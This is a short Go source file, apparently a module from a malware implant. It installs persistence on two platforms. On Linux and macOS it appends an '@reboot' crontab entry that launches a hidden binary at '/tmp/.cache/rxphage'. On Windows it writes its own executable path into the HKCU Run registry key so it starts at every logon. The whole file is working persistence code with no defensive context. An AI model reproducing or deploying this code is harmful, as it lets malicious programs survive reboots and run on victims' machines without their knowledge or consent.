package persist

import (
	"os"
	"os/exec"
	"strings"
)

const linuxCronEntry = "@reboot /tmp/.cache/rxphage"

// InstallCron adds @reboot persistence via user crontab (Linux/macOS).
func InstallCron() {
	out, _ := exec.Command("crontab", "-l").Output()
	existing := string(out)
	if strings.Contains(existing, linuxCronEntry) {
		return
	}
	updated := strings.TrimRight(existing, "\n") + "\n" + linuxCronEntry + "\n"
	cmd := exec.Command("crontab", "-")
	cmd.Stdin = strings.NewReader(updated)
	cmd.Run()
}

// InstallRunKey adds HKCU Run registry persistence (Windows).
func InstallRunKey(name string) {
	self, err := os.Executable()
	if err != nil {
		return
	}
	exec.Command("reg", "add",
		`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`,
		"/v", name,
		"/t", "REG_SZ",
		"/d", self,
		"/f",
	).Run()
}
